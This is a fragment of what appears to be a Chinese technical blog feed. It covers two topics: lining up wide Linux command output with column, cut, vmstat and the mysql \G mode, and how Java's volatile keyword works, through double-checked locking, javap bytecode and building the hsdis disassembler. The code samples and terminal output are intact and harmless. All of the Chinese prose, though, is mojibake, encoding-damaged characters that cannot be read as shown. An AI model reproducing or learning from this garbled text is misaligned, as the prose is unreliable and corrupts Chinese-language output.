<p>ä¸ºäº†å½¢å¼ä¸Šçš„å¥½çœ‹, è¿˜æ˜¯å¿ä¸€å¿å§.</p>
<h3 id="è¡Œå¤ªé•¿äº†"><a href="#è¡Œå¤ªé•¿äº†" class="headerlink" title="è¡Œå¤ªé•¿äº†?"></a>è¡Œå¤ªé•¿äº†?</h3><p>æœ‰çš„æ—¶å€™ä¼šé‡åˆ°å¦å¤–ä¸€ç§æƒ…å†µ, å°±æ˜¯ä¸€è¡Œå¤ªé•¿äº†, è¿™æ—¶å€™æ»¡å±éƒ½æ˜¯èŠ±çš„, æ¯”å¦‚ä¸‹é¢è¿™ä¸ª:</p>
<img src="/2018/07/11/column-view/mess.png" title="ç»ˆç«¯ä¸­æ‚ä¹±çš„è¾“å‡º">
<p>ç»ˆç«¯ä¸­æ˜¾ç¤ºçš„æ˜¯æ‚ä¹±çš„, ä½†æ˜¯æ•´ä¸ªå¤åˆ¶å‡ºæ¥å°±ç¥å¥‡çš„å˜å¥½äº†(æ³¨æ„, ä¸è¦æ‰“å¼€text wrapping)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs </span><br><span class="line">                    CPU0       CPU1       CPU2       CPU3       CPU4       CPU5       CPU6       CPU7       CPU8       CPU9       CPU10      CPU11      CPU12      CPU13      CPU14      CPU15      CPU16      CPU17      CPU18      CPU19      CPU20      CPU21      CPU22      CPU23      CPU24      CPU25      CPU26      CPU27      CPU28      CPU29      CPU30      CPU31      </span><br><span class="line">          HI:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          6          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          1          0</span><br><span class="line">       TIMER:   43050851   44411905   43919992   42442914   43015809   42846597   42569992   41861589   48809346   43382044   43304198   43899929   46604992   49141675   43598221   44605969   36416696   40245419   43755210   38241174   40310482   36846535   40234221   36373316   37261964   40299828   40815229   48124964   38746814   40687667   39654342   44596933</span><br><span class="line">      NET_TX:     159131      57649        987        947       1124        960        887        897      53415      44445        907        982       5556      31456        921        928        604        665      58417        565       4375        615      16263        532        658        573      15546      23825        560       3679        537      11125</span><br><span class="line">      NET_RX:   54739232  104971608     175092     144098     287613     181637     274003     105699  137866529   37821843     114651       5258   31830654   74227300     149144      41791      32428      12501  136630455      80495   49754625     158541   30734583       3512       2284       2796   35459431  131330367      78501   89945954      50223  117038378</span><br><span class="line">       BLOCK:      81587     139726     179707     144663     159758     190601     132768     276230      72676     287984     130253     323938     152578     206060     141233     141074     193578     251093        448     131136      62687     150827     194672     388017      81603     163935     175096     166935     330730      47293     161579      54246</span><br><span class="line">BLOCK_IOPOLL:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">     TASKLET:    1675397    3309130       9569       4022       2764       5093       4897      10826    4444030    1454707       1496        286    1048531    2576975        811       2119        442        417    4300523        260    1552321        418    1015839      10748        510        218    1121876    4256900        115    3020283        287    3986726</span><br><span class="line">       SCHED:   15007043   12859515   11501051   11259112   10939612   10774900   10462556   10131094   14234569   10072702    9984370   10190600   11242845   12149746    9940021   10177032    6683735    7652871   10904532    7456442    9226435    7306446    8605291    6707082    6480350    7086698    8286905   11682767    7195542    8529887    7447246   10396247</span><br><span class="line">     HRTIMER:          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0          0</span><br><span class="line">         RCU:   17206657   17427121   18015842   17756453   17731002   17874141   17772044   17467329   18480130   17666877   17975799   18291442   18971854   19696035   18311040   18486331   14653377   16665048   16695739   15810275   15832142   14999192   15912229   14669770   14782425   16825467   16554916   18592285   15670613   15416856   16010390   16910501</span><br></pre></td></tr></table></figure>
<p>wtf!!!</p>
<p>è¿™æ—¶å€™å°±éœ€è¦ç»“åˆcutæ¥å‘æŒ¥ä½œç”¨äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c -160</span><br><span class="line">CPU0           CPU1      CPU2       CPU3      CPU4      CPU5      CPU6      CPU7      CPU8      CPU9       CPU10     CPU11     CPU12     CPU13     CPU14     CPU</span><br><span class="line">HI:            0         0          0         0         0         0         0         0         0          0         0         0         0         0         6  </span><br><span class="line">TIMER:         42897374  44265424   43773013  42294893  42872190  42703730  42422299  41715918  48651925   43219235  43155865  43751531  46455390  48993651  434</span><br><span class="line">NET_TX:        158851    57164      981       939       1119      956       882       894       53297      43884     904       980       5551      31451     917</span><br><span class="line">NET_RX:        54266774  104535675  175086    144094    287558    181540    273997    105609    137397792  37471099  114548    5252      31830477  74227296  149</span><br><span class="line">BLOCK:         81585     139726     179707    144265    159758    190245    132562    275983    72656      287710    130180    323916    152544    205625    140</span><br><span class="line">BLOCK_IOPOLL:  0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">TASKLET:       1661705   3295175    9569      4022      2764      5093      4897      10826     4429925    1442145   1496      286       1048531   2576975   811</span><br><span class="line">SCHED:         14954535  12813884   11459036  11217505  10901019  10736479  10424577  10093709  14202602   10037804  9955899   10162495  11215015  12123529  991</span><br><span class="line">HRTIMER:       0         0          0         0         0         0         0         0         0          0         0         0         0         0         0  </span><br><span class="line">RCU:           17145747  17366996   17952484  17693839  17671645  17814624  17709279  17405994  18416537   17600989  17910864  18226002  18906471  19629970  182</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 150-300</span><br><span class="line">U14     CPU15     CPU16     CPU17     CPU18     CPU19      CPU20     CPU21     CPU22     CPU23     CPU24     CPU25     CPU26     CPU27     CPU28      C</span><br><span class="line">        6         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">030995  43485667  44493659  36326549  40157402  43631283   38151873  40219806  36756938  40144515  36283732  37161284  40199408  40717545  48006972   3</span><br><span class="line">451     917       925       601       662       58258      560       4373      614       16262     532       656       572       15544     23806      5</span><br><span class="line">227296  149142    41791     32391     12499     136276000  80492     49754624  158467    30734581  3506      2281      2795      35459426  131010842  7</span><br><span class="line">5644    140738    141074    192744    251010    448        130632    62646     150826    193938    387975    81598     163807    174560    166894     3</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">76975   811       2119      442       417       4290461    260       1552321   418       1015839   10748     510       218       1121876   4247160    1</span><br><span class="line">130763  9918727   10155044  6665114   7634478   10872508   7435459   9208357   7287842   8584087   6687254   6464581   7069601   8268941   11657561   7</span><br><span class="line">        0         0         0         0         0          0         0         0         0         0         0         0         0         0          0</span><br><span class="line">645462  18260707  18436150  14614558  16626358  16648198   15772191  15794569  14960694  15874249  14631009  14737925  16781205  16511913  18544088   1</span><br><span class="line"></span><br><span class="line">[qisheng.li@l-hpbreezep20.h.cn2 ~]$ cat /proc/softirqs | column -t  | cut -c 290-</span><br><span class="line">PU28      CPU29     CPU30     CPU31</span><br><span class="line">          0         0         1         0</span><br><span class="line">8025761   38667794  40583340  39575602  44506422</span><br><span class="line">3810      555       3672      535       11121</span><br><span class="line">31059150  78501     89665808  50166     116771524</span><br><span class="line">66900     330730    47290     161396    54232</span><br><span class="line">          0         0         0         0</span><br><span class="line">248714    115       3012042   287       3978676</span><br><span class="line">1661902   7180114   8511025   7432308   10374288</span><br><span class="line">          0         0         0         0</span><br><span class="line">8550398   15634808  15373695  15974460  16871666</span><br></pre></td></tr></table></figure>
<p>æ•´æ•´é½é½æ‰å¥½çœ‹å•Š!<br>å”‰, <code>cpu</code>å¤ªå¤šä¹Ÿæ˜¯éº»çƒ¦å•Š</p>
<h2 id="å…¶ä»–æ€è·¯"><a href="#å…¶ä»–æ€è·¯" class="headerlink" title="å…¶ä»–æ€è·¯"></a>å…¶ä»–æ€è·¯</h2><p>ä»Šå¤©åœ¨<code>æ€§èƒ½ä¹‹å·…</code>å‘ç°, <code>vmstat</code>æ”¯æŒåˆ—æ¨¡å¼, <code>-s</code>å¯ä»¥æŒ‰ç…§åˆ—è¾“å‡º, <code>-Sm</code>ä¿®æ”¹è¾“å‡ºçš„å•ä½ä¸º<code>m</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~  vmstat -asSm 1 </span><br><span class="line">        12500 m total memory</span><br><span class="line">         4053 m used memory</span><br><span class="line">         5919 m active memory</span><br><span class="line">         1883 m inactive memory</span><br><span class="line">         3940 m free memory</span><br><span class="line">          760 m buffer memory</span><br><span class="line">         3745 m swap cache</span><br><span class="line">         4294 m total swap</span><br><span class="line">            0 m used swap</span><br><span class="line">         4294 m free swap</span><br><span class="line">       606762 non-nice user cpu ticks</span><br><span class="line">         3887 nice user cpu ticks</span><br><span class="line">       140316 system cpu ticks</span><br><span class="line">      8108433 idle cpu ticks</span><br><span class="line">        91538 IO-wait cpu ticks</span><br><span class="line">            0 IRQ cpu ticks</span><br><span class="line">         3461 softirq cpu ticks</span><br><span class="line">            0 stolen cpu ticks</span><br><span class="line">      2775187 pages paged in</span><br><span class="line">      3731660 pages paged out</span><br><span class="line">            0 pages swapped in</span><br><span class="line">            0 pages swapped out</span><br><span class="line">     16443967 interrupts</span><br><span class="line">     81534611 CPU context switches</span><br><span class="line">   1532129612 boot time</span><br><span class="line">        39867 forks</span><br></pre></td></tr></table></figure>
<p>mysqlä¹Ÿæœ‰å¯¹åº”çš„åˆ—æ¨¡å¼:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *  from hotel_order_simple limit 1;</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| id   | uid             | order_no     | user_name   | contact_phone | card_index | create_date         | order_type | user_status | terminal | room_type | region_type | update_time         |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">| 1109 | 66666666666666 | 66666666666666 | 66666666666666 | 66666666666666   |            | 2018-06-03 11:12:14 | 1005001    |      100070 | app      |         0 |           1 | 2018-06-04 20:09:56 |</span><br><span class="line">+------+-----------------+--------------+-------------+---------------+------------+---------------------+------------+-------------+----------+-----------+-------------+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">// åˆ—æ¨¡å¼</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from hotel_order_simple limit 1 \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           id: 1109</span><br><span class="line">          uid: 66666666666666</span><br><span class="line">     order_no: 66666666666666</span><br><span class="line">    user_name: 66666666666666</span><br><span class="line">contact_phone: 66666666666666</span><br><span class="line">   card_index: </span><br><span class="line">  create_date: 2018-06-03 11:12:14</span><br><span class="line">   order_type: 1005001</span><br><span class="line">  user_status: 100070</span><br><span class="line">     terminal: app</span><br><span class="line">    room_type: 0</span><br><span class="line">  region_type: 1</span><br><span class="line">  update_time: 2018-06-04 20:09:56</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥, æœ‰çš„æ—¶å€™å¤šçœ‹çœ‹æ‰‹å†Œä¹Ÿä¸é”™.</p>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> format </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[volatile]]></title>
      <url>http://qsli.github.io/2018/07/08/volatile/</url>
      <content type="html"><![CDATA[<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>volatileçš„ä½œç”¨:</p>
<p>1.ä¿è¯å¤šä¸ªçº¿ç¨‹â€åŒæ—¶â€ä¿®æ”¹â€å…±äº«â€å˜é‡æ—¶ä¸ä¼šå› ä¸ºcpu cacheç­‰åŸå› è€Œé€ æˆä¸ä¸€è‡´,  </p>
<p>2.å¦å¤–çš„ä½œç”¨å°±æ˜¯é˜²æ­¢æŒ‡ä»¤é‡æ’</p>
<h2 id="é˜²æ­¢æŒ‡ä»¤é‡æ’"><a href="#é˜²æ­¢æŒ‡ä»¤é‡æ’" class="headerlink" title="é˜²æ­¢æŒ‡ä»¤é‡æ’"></a>é˜²æ­¢æŒ‡ä»¤é‡æ’</h2><p><code>Double-Checked Locking</code>ä¸­å®ä¾‹å¿…é¡»å¯ä»¥é€šè¿‡åŠ ä¸Š<code>volatile</code>å…³é”®å­—æ¥é˜²æ­¢é˜²æ­¢æŒ‡ä»¤é‡æ’äº§ç”Ÿçš„å½±å“.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Works with acquire/release semantics for volatile</span></span><br><span class="line"><span class="comment">// Broken under current semantics for volatile</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">        <span class="comment">// æ³¨æ„å¿…é¡»æ˜¯volatile</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">volatile</span> Helper helper = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Helper <span class="title">getHelper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (helper == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (helper == <span class="keyword">null</span>)</span><br><span class="line">                        helper = <span class="keyword">new</span> Helper();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> helper;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h2><h3 id="å­—èŠ‚ç "><a href="#å­—èŠ‚ç " class="headerlink" title="å­—èŠ‚ç "></a>å­—èŠ‚ç </h3><p>æŸ¥çœ‹ç¼–è¯‘åçš„å­—èŠ‚ç :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">âœ  jvm  javap -v -p  Foo</span><br><span class="line">Classfile /home/qishengli/test/jvm/Foo.class</span><br><span class="line">  Last modified Jul 8, 2018; size 521 bytes</span><br><span class="line">  MD5 checksum 1bacc25f9d4c0bf1b0b5c0f46172767f</span><br><span class="line">  Compiled from &quot;Foo.java&quot;</span><br><span class="line">class Foo</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #6.#22         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Fieldref           #5.#23         // Foo.helper:LFoo$Helper;</span><br><span class="line">   #3 = Class              #24            // Foo$Helper</span><br><span class="line">   #4 = Methodref          #3.#25         // Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">   #5 = Class              #26            // Foo</span><br><span class="line">   #6 = Class              #27            // java/lang/Object</span><br><span class="line">   #7 = Utf8               Helper</span><br><span class="line">   #8 = Utf8               InnerClasses</span><br><span class="line">   #9 = Utf8               helper</span><br><span class="line">  #10 = Utf8               LFoo$Helper;</span><br><span class="line">  #11 = Utf8               &lt;init&gt;</span><br><span class="line">  #12 = Utf8               ()V</span><br><span class="line">  #13 = Utf8               Code</span><br><span class="line">  #14 = Utf8               LineNumberTable</span><br><span class="line">  #15 = Utf8               getHelper</span><br><span class="line">  #16 = Utf8               ()LFoo$Helper;</span><br><span class="line">  #17 = Utf8               StackMapTable</span><br><span class="line">  #18 = Class              #27            // java/lang/Object</span><br><span class="line">  #19 = Class              #28            // java/lang/Throwable</span><br><span class="line">  #20 = Utf8               SourceFile</span><br><span class="line">  #21 = Utf8               Foo.java</span><br><span class="line">  #22 = NameAndType        #11:#12        // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #23 = NameAndType        #9:#10         // helper:LFoo$Helper;</span><br><span class="line">  #24 = Utf8               Foo$Helper</span><br><span class="line">  #25 = NameAndType        #11:#29        // &quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">  #26 = Utf8               Foo</span><br><span class="line">  #27 = Utf8               java/lang/Object</span><br><span class="line">  #28 = Utf8               java/lang/Throwable</span><br><span class="line">  #29 = Utf8               (LFoo;)V</span><br><span class="line">&#123;</span><br><span class="line">  private volatile Foo$Helper helper;</span><br><span class="line">    descriptor: LFoo$Helper;</span><br><span class="line">    flags: ACC_PRIVATE, ACC_VOLATILE</span><br><span class="line"></span><br><span class="line">  Foo();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags:</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: aload_0</span><br><span class="line">         5: aconst_null</span><br><span class="line">         6: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         9: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 1: 0</span><br><span class="line">        line 2: 4</span><br><span class="line"></span><br><span class="line">  public Foo$Helper getHelper();</span><br><span class="line">    descriptor: ()LFoo$Helper;</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=4, locals=3, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">         4: ifnonnull     40</span><br><span class="line">         7: aload_0</span><br><span class="line">         8: dup</span><br><span class="line">         9: astore_1</span><br><span class="line">        10: monitorenter</span><br><span class="line">        11: aload_0</span><br><span class="line">        12: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        15: ifnonnull     30</span><br><span class="line">        18: aload_0</span><br><span class="line">        19: new           #3                  // class Foo$Helper</span><br><span class="line">        22: dup</span><br><span class="line">        23: aload_0</span><br><span class="line">        24: invokespecial #4                  // Method Foo$Helper.&quot;&lt;init&gt;&quot;:(LFoo;)V</span><br><span class="line">        27: putfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        30: aload_1</span><br><span class="line">        31: monitorexit</span><br><span class="line">        32: goto          40</span><br><span class="line">        35: astore_2</span><br><span class="line">        36: aload_1</span><br><span class="line">        37: monitorexit</span><br><span class="line">        38: aload_2</span><br><span class="line">        39: athrow</span><br><span class="line">        40: aload_0</span><br><span class="line">        41: getfield      #2                  // Field helper:LFoo$Helper;</span><br><span class="line">        44: areturn</span><br><span class="line">      Exception table:</span><br><span class="line">         from    to  target type</span><br><span class="line">            11    32    35   any</span><br><span class="line">            35    38    35   any</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 4: 0</span><br><span class="line">        line 5: 7</span><br><span class="line">        line 6: 11</span><br><span class="line">        line 7: 18</span><br><span class="line">        line 9: 30</span><br><span class="line">        line 11: 40</span><br><span class="line">      StackMapTable: number_of_entries = 3</span><br><span class="line">        frame_type = 252 /* append */</span><br><span class="line">          offset_delta = 30</span><br><span class="line">          locals = [ class java/lang/Object ]</span><br><span class="line">        frame_type = 68 /* same_locals_1_stack_item */</span><br><span class="line">          stack = [ class java/lang/Throwable ]</span><br><span class="line">        frame_type = 250 /* chop */</span><br><span class="line">          offset_delta = 4</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;Foo.java&quot;</span><br><span class="line">InnerClasses:</span><br><span class="line">     #7= #3 of #5; //Helper=class Foo$Helper of class Foo</span><br></pre></td></tr></table></figure>
<p>å»æ‰<code>volatile</code>å…³é”®å­—, åå¯¹æ¯”ç”Ÿæˆçš„å­—èŠ‚ç :</p>
<img src="/2018/07/08/volatile/diff.png" title="ä¸¤æ¬¡ç”Ÿæˆå­—èŠ‚ç çš„diff">
<p>å¯è§åªæ˜¯å¤šäº†ä¸€ä¸ªè®¿é—®çš„è¡¨ç¤º<code>ACC_VOLATILE</code></p>
<p>ä»<code>The JavaÂ® Virtual Machine Specification</code>ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹çš„è¯´æ˜:</p>
<blockquote>
<p>ACC_VOLATILE 0x0040 Declared volatile; cannot be cached;</p>
</blockquote>
<p>æ—¢ç„¶å­—èŠ‚ç å±‚é¢æ‰¾ä¸åˆ°å¤ªå¤šçš„è››ä¸é©¬è¿¹, æˆ‘ä»¬æ¥çœ‹çœ‹æ±‡ç¼–çš„ä»£ç </p>
<h3 id="æ±‡ç¼–ä»£ç "><a href="#æ±‡ç¼–ä»£ç " class="headerlink" title="æ±‡ç¼–ä»£ç "></a>æ±‡ç¼–ä»£ç </h3><p>è¦æŸ¥çœ‹æ±‡ç¼–ä»£ç éœ€è¦ç”¨åˆ°ä¸€ä¸ªå«åš<code>hsdis</code>(A HotSpot plugin for disassembling dynamically generated code.)çš„å·¥å…·, è¿™ä¸ªå·¥å…·å¯ä»¥è‡ªå·±ä¸‹è½½<code>openjdk</code>çš„ä»£ç ç¼–è¯‘, ä¹Ÿå¯ä»¥ä¸‹è½½åˆ«äººå·²ç»ç¼–è¯‘å¥½çš„.</p>
<p><code>openjdk</code>ä¸­å¯¹åº”çš„æºç :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">âœ  jvm  locate hsdis         </span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/Makefile</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/README</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis-demo.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.c</span><br><span class="line">/home/qishengli/openjdk-8-src-b132-03_mar_2014-master/openjdk/hotspot/src/share/tools/hsdis/hsdis.h</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘æ—¶éœ€è¦ä¸‹è½½<code>binutils-2.19.1</code>, ç¼–è¯‘å‘½ä»¤å¦‚ä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ  hsdis  ls</span><br><span class="line">binutils-2.19.1  binutils-2.19.1.tar.bz2  build  hsdis.c  hsdis-demo.c  hsdis.h  Makefile  README</span><br><span class="line">âœ  hsdis  sudo make BINUTILS=binutils-2.19.1 ARCH=amd64</span><br></pre></td></tr></table></figure>
<p>ä¸è¿‡<code>binutils</code>çš„ç¼–è¯‘é…ç½®ä¸­, å¦‚æœç”¨çš„æ˜¯gccç¼–è¯‘ä¼šæŠŠæ‰€æœ‰çš„warningå½“ä½œerror, å¯ä»¥çœ‹åˆ°config.logçš„è¾“å‡º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc1: all warnings being treated as errors</span><br></pre></td></tr></table></figure></p>
<p>å¼ºè¡Œæ›¿æ¢<code>-Werror</code>ä¸ºâ€™â€™:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &quot;åŒ…å«-Werrorçš„æ–‡ä»¶&quot; | xargs -I&#123;&#125; sudo sed -i &quot;s#-Werror##g&quot; &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>å†ç¼–è¯‘å°±å¥½äº†!</p>
<p>è‡³äºå®‰è£…, ä»–çš„<code>README</code>ä¸­å·²ç»è¯´çš„å¾ˆæ¸…æ¥šäº†</p>
